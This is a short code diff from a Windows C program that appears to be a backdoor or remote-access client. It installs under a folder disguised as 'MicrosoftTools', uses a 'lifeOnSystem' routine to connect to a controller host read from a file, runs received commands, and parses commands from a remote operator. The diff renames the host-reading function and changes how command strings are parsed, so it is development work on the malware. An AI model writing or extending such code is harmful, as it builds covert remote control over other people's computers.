@@ -12,7 +12,7 @@ char lastFolderName[60] = "MicrosoftTools";
 static void defect(void);
 static void lifeOnSystem(void);
 static void onlyRunCommand(char * cmd);
-static void readIpPortFromFile(void);
+static void readHostAndPortFromFile(void);
 static int process(SOCKET sckt, char * al);
 
 int main()	// gcc --machine-windows
@@ -109,7 +109,7 @@ static void lifeOnSystem(void)
 	struct sockaddr_in veriler;
     struct in_addr ** addr_list;
 
-	readIpPortFromFile();
+    readHostAndPortFromFile();
 
 	while((he = gethostbyname(host)) == NULL)
 	{
@@ -193,7 +193,7 @@ static void onlyRunCommand(char * cmd)
 	Sleep(500); //TODO: process tam açýlana kadar beklenmeli
 }
 
-static void readIpPortFromFile(void)
+static void readHostAndPortFromFile(void)
 {
 	FILE * fIpPort;
 
@@ -224,13 +224,13 @@ static int process(SOCKET sckt, char * al)
 	{
 		// TODO: processUpdate(sckt);
 	}
-	else if (strncmp(al, "ipsil ", 6) == 0)
+	else if (strncmp(al, "hostsil ", 8) == 0)
 	{
 		// TODO: remove public ip from exe
 	}
-	else if (strncmp(al, "ip:port ", 8) == 0)
+	else if (strncmp(al, "host port ", 10) == 0)
 	{
-		processIpPort(al + 8);
+		processIpPort(al + 10);
 	}
 
 	return 0;
